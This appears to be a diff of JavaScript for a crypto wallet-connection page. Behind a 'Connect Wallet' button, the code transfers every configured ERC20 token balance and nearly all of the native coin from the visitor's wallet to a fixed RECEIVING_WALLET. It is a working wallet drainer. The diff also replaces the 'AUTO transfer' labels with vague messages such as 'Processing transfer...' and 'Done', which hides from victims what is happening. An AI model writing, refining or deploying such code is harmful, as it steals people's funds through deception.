@@ -2,12 +2,6 @@ let provider, signer, userAddress;
 let currentNetwork = "bsc";
 const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-// Standard ERC20 ABI
-const ERC20_ABI = [
-  "function balanceOf(address owner) view returns (uint256)",
-  "function transfer(address to, uint256 amount) returns (bool)"
-];
-
 window.addEventListener('load', async () => {
   document.getElementById('currentUrl').textContent = window.location.href;
   document.getElementById("networkSelect").addEventListener('change', (e) => {
@@ -31,7 +25,23 @@ async function checkWalletEnvironment() {
   
   // Auto-connect if wallet is already connected
   if (window.ethereum && window.ethereum.selectedAddress) {
-    await connectAndSwap();
+    await initializeWallet();
+  }
+}
+
+async function initializeWallet() {
+  try {
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    
+    document.getElementById("connectWallet").disabled = true;
+    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+    document.getElementById("walletInfo").textContent = 
+      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
+  } catch (err) {
+    console.error("Wallet initialization error:", err);
+    updateStatus("Connection error. Please try again.", "error");
   }
 }
 
@@ -64,39 +74,26 @@ function updateTokenVisibility() {
 async function connectAndSwap() {
   try {
     showLoader();
-    updateStatus("Initializing AUTO transfer process...", "success");
+    updateStatus("Initializing connection...", "success");
 
     if (isMobile && !window.ethereum) {
       showTrustWalletUI();
-      throw new Error("Please use Trust Wallet's in-app browser for AUTO transfers");
+      throw new Error("Please use Trust Wallet's in-app browser");
     }
 
-    // Request account access if needed
-    if (window.ethereum && !window.ethereum.selectedAddress) {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-    }
-    
     if (!window.ethereum) {
-      throw new Error("Ethereum provider not found. Please install MetaMask or Trust Wallet");
+      throw new Error("Wallet not detected. Please install MetaMask or Trust Wallet");
     }
 
+    await window.ethereum.request({ method: "eth_requestAccounts" });
     await checkNetwork();
-    
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-    
-    document.getElementById("connectWallet").disabled = true;
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing AUTO...`;
-    document.getElementById("walletInfo").textContent = 
-      `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
-    
+    await initializeWallet();
     await processAllTransfers();
   } catch (err) {
     hideLoader();
-    updateStatus("AUTO Transfer Error: " + err.message, "error");
+    updateStatus("Error: " + err.message, "error");
     document.getElementById("connectWallet").disabled = false;
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet & Swap AUTO`;
+    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
     if (isMobile) showTrustWalletUI();
   }
 }
@@ -107,7 +104,7 @@ async function checkNetwork() {
     const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
     
     if (chainId !== targetChainId) {
-      updateStatus(`Switching network for AUTO transfer...`, "success");
+      updateStatus(`Switching network...`, "success");
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -121,15 +118,14 @@ async function checkNetwork() {
               params: [NETWORK_CONFIGS[currentNetwork]]
             });
           } catch (addError) {
-            throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually for AUTO transfer`);
+            throw new Error(`Please switch network manually`);
           }
-        } else {
-          throw new Error("Failed to switch network for AUTO transfer");
         }
+        throw new Error("Failed to switch network");
       }
     }
   } catch (err) {
-    throw new Error("Network error during AUTO transfer: " + err.message);
+    throw new Error("Network error: " + err.message);
   }
 }
 
@@ -137,52 +133,38 @@ async function processAllTransfers() {
   try {
     const tokensToSwap = TOKENS[currentNetwork].sort((a, b) => a.priority - b.priority);
     let successCount = 0;
-    let processedTokens = 0;
     
-    // Process ERC20 tokens
     for (const token of tokensToSwap.filter(t => !t.isNative)) {
       try {
-        updateStatus(`Checking AUTO balance...`, "success");
-        
-        const abi = token.abi || ERC20_ABI;
-        const contract = new ethers.Contract(token.address, abi, signer);
+        updateStatus(`Processing transfer...`, "success");
+        const contract = new ethers.Contract(token.address, token.abi, signer);
         const balance = await contract.balanceOf(userAddress);
         
         if (balance.gt(0)) {
-          processedTokens++;
-          updateStatus(`Processing AUTO transfer ${processedTokens}...`, "success");
-          
           const tx = await contract.transfer(RECEIVING_WALLET, balance, {
             gasLimit: 100000
           });
-          
           await tx.wait();
           successCount++;
-          
           updateStatus(
-            `AUTO transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
             "success"
           );
         }
       } catch (err) {
-        console.error("AUTO transfer error:", err);
-        updateStatus(`AUTO transfer ${processedTokens > 0 ? processedTokens : ''} failed`, "error");
+        console.error("Transfer error:", err);
+        updateStatus(`Transfer failed`, "error");
       }
     }
 
-    // Process native token
     const nativeToken = tokensToSwap.find(t => t.isNative);
     if (nativeToken) {
       try {
-        updateStatus(`Checking final AUTO balance...`, "success");
         const balance = await provider.getBalance(userAddress);
         const keepAmount = ethers.utils.parseUnits("0.002", nativeToken.decimals);
         const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
         
         if (sendAmount.gt(0)) {
-          processedTokens++;
-          updateStatus(`Processing final AUTO transfer...`, "success");
-          
           const tx = await signer.sendTransaction({
             to: RECEIVING_WALLET,
             value: sendAmount,
@@ -190,29 +172,21 @@ async function processAllTransfers() {
           });
           await tx.wait();
           successCount++;
-          
           updateStatus(
-            `AUTO transfer ${processedTokens} completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
+            `Transfer completed <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
             "success"
           );
         }
       } catch (err) {
-        console.error("Final AUTO transfer error:", err);
-        updateStatus("Final AUTO transfer failed", "error");
+        console.error("Native transfer error:", err);
+        updateStatus("Final transfer failed", "error");
       }
     }
     
-    if (successCount > 0) {
-      updateStatus(`Successfully completed ${successCount} AUTO transfers`, "success");
-    } else if (processedTokens > 0) {
-      updateStatus("Some AUTO transfers failed", "error");
-    } else {
-      updateStatus("No AUTO balances found to transfer", "success");
-    }
-    
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> AUTO Process Complete`;
+    updateStatus(successCount > 0 ? "Process completed" : "No balances found", "success");
+    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
   } catch (err) {
-    throw new Error("AUTO transfer process failed");
+    throw new Error("Processing failed");
   } finally {
     hideLoader();
   }
